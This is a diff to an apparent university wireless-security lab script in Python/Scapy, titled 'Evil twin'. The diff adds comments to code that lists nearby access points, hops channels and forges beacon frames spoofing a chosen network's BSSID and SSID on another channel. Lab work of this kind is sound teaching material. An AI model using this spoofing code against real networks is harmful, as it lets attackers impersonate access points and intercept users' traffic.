@@ -1,17 +1,19 @@
 #!/usr/bin/env python3
 
 """
-Author: Rébecca Tevaearai, 
+SWI laboratory - script n°2 - Evil twin
+
+Author: Rébecca Tevaearai, Rosy-Laure Wonjamouna
 
 Created: 26th March, 2022
 
-Dresse une liste des SSID disponibles à proximité.
-Présente à l'utilisateur la liste, avec les numéros de canaux
-et les puissances.
-Permet à l'utilisateur de choisir le réseau à attaquer.
-Génére un beacon concurrent annonçant un réseau sur un canal
-différent se trouvant à 6 canaux de séparation du réseau
-original
+1. Dresse une liste des SSID disponibles à proximité.
+2. Présente à l'utilisateur la liste, avec les numéros de canaux
+   et les puissances.
+3. Permet à l'utilisateur de choisir le réseau à attaquer.
+4. Génére un beacon concurrent annonçant un réseau sur un canal
+   différent se trouvant à 6 canaux de séparation du réseau
+   original
 
 """
 
@@ -27,9 +29,12 @@ ap_list = []
 start_hopper = True
 
 def scan(pkt):
+    """
+    Scan to discover AP
+    """
     if pkt.haslayer(Dot11Beacon):
-        stats = pkt[Dot11Beacon].network_stats()
-        channel = stats.get("channel")
+        stats = pkt[Dot11Beacon].network_stats() # to get the channel of the packet
+        channel = stats.get("channel") 
         if [pkt.addr2, pkt.info, channel] not in ap_list:
             
             try:
@@ -49,6 +54,9 @@ def showAPs():
 
 
 def hopper(interface):
+    """
+    Channel hopper
+    """
     while start_hopper:
         channel = random.randrange(1, 12)
         os.system("iwconfig %s channel %d" % (interface, channel))
@@ -60,6 +68,10 @@ def setChannel(interface, channel):
 
 
 def evil_twin(channel, target_mac, target_ssid, interface):
+    """
+    Function that create a fake twin of an AP by sending beacon packet 
+    with the same BSSID and SSID but on a different channel. 
+    """
     setChannel(interface, channel)
 
     dot11 = Dot11(type = 0, subtype = 8, addr1 = 'ff:ff:ff:ff:ff:ff', addr2 = target_mac, addr3 = target_mac)
@@ -75,12 +87,13 @@ if __name__ == '__main__':
     parser.add_argument("-i", "--interface", required = True, help = "the interface name")
     args = parser.parse_args()
 
+    # start the channel hopper to discover more packet
     thread = threading.Thread(target=hopper, args=(args.interface, ), name="hopper")
     thread.start()
 
     showAPs()
     
-    start_hopper = False
+    start_hopper = False # stop the channel hopper
 
     index = int(input("\nChoose an SSID to attack (enter index): "))
     
